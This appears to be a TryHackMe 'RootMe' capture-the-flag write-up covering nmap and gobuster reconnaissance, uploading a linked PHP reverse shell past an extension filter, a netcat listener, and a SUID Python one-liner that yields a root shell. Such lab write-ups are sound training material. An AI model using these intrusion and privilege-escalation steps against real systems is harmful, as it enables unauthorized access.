+++
title = "Root Me: TryHackMe Writeup"
date = "2021-02-12"
+++

# Try Hack Me - RootMe
A ctf for beginners, can you root me?
<br>
---
## Reconnaissance
1. Scan the machine, how many ports are open?
	Here is the nmap scann commands that I am going to be using.
	```
	nmap -sC -sV -T4 -A -oN nmap/result <IP>
	```
	Breakdown:
	```
	-A: do an extensive scan on these ports

	-sC: Scan with default NSE scripts. Considered useful for discovery and safe

	-sV: Attempts to determine the version of the service running on port

	-T4: speed of nmap scan is 4/5 (personal preference of mine)

	-oN: Normal output to the file normal.file
	```
2. What version of Apache is running?
		Let's review out nmap scans and see if we are able to find what version of Apache we are running.
	```
	Host is up (0.14s latency).
	Not shown: 998 closed ports
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
	|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
	|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	|_http-title: HackIT - Home
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	```

3. What service is running on port 22?
	If you review the resutls fo the nmap scan you will see that there is a service running on port 22.
 4. Find directories on the web server using the GoBuster tool.
 	We are going to run the following gobuster command to search for the hidden directory that they want us to find.
	 ```
	 gobuster dir -t 40 -u <IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
	 ```
	 Breakdown:
	 ```
	-u: Full URL (including scheme), or base domain name.

	-t: Thread Usage, declare how mand thread you would like gobuster to use. (Default is 10)

	-w: Path to the wordlist used for brute forcing (use – for stdin)
	```

 5. What is the hidden directory?
	 Do any of these directiores stand out!
	 ```
	 ===============================================================
	Gobuster v3.0.1
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
	===============================================================
	[+] Url:            http://<IP>/
	[+] Threads:        40
	[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
	[+] Status codes:   200,204,301,302,307,401,403
	[+] User Agent:     gobuster/3.0.1
	[+] Timeout:        10s
	===============================================================
	2021/02/11 19:14:32 Starting gobuster
	===============================================================
	/uploads (Status: 301)
	/css (Status: 301)
	/js (Status: 301)
	/panel (Status: 301)
	Progress: 23943 / 220561 (10.86%)^C
	[!] Keyboard interrupt detected, terminating.
	===============================================================
	2021/02/11 19:15:44 Finished
	===============================================================

	 ```
---
## Getting a shell
1. Find a form to upload and get a reverse shell, and find the flag.
	In out last question we found a hidden directory.
	Let's open up our browser and got the following `http:\\<IP>\uploads`
{{< figure src="/images/rootme/1.png" width="200">}}
	Now lets try and upload a php reverse shell.  
	[Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) is a great resourse for us to use.
	Now that we have our reverse shell let's add the ip address of our device into it and pick out a port we want to listen in on.
	Ok, lets try and upload our reverse shell... It looks like are now able to upload our file.
{{< figure src="/images/rootme/2.png" width="200">}}
	How about we change the extention from PHP to PHP5 and then try again.
	How about them apples, it uploaded. 
	Before we try and excute our payload lets set up a netcat listener.
	`nc -nlvp <port#>`
	Once our listener has been set up lets pull the trigger on our reverse shell and see if a connection can be made.
{{< figure src="/images/rootme/3.png" width="200">}}
BOOM!! We have a connection.
The next thing we need to do is find the user.txt file.
I tried looking in all the stander places like the current user directory and in the home directory but I did not have any luck.
So I decided to use the find command `find / -type f -name user.txt 2> /dev/null`
With this command I was able to locate where our user.txt file is. 
Now all we need to do is cat out the content of our user.txt file and we will have our flag.  

Breakdown:
```
* -type f – you are telling find to look exclusively for files
* -name user.txt – instructing the find command to search for a file with the name “user.txt”
* 2> /dev/null – so error messages do not show up as part of the search result 
```


## Privilege escalation
---
1. Search for files with SUID permission, which file is weird?
	Again here we are going to be using the `find` command to help us locate our file with a weird SUID permission.
```
find / -type f -user root -perm -u=s 2> /dev/null_**
```
Now how can use leverage this what we have found to escalate out privileges to a root shell.
[GTFO Bins](https://gtfobins.github.io/gtfobins/python/#suid) is another great resourse that we can use. 
Let's head over there and look up the SUID for python.
It seems that we are that we are able to use the code below to gain a root shell.
````
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
````
2. root.txt
	One we have verified that we are actually running as root we will just need to cat out the content of out root.txt file.
`cat /root/root.txt`

# Congratulations you have just completed the RootMe challenge from TryHackMe!
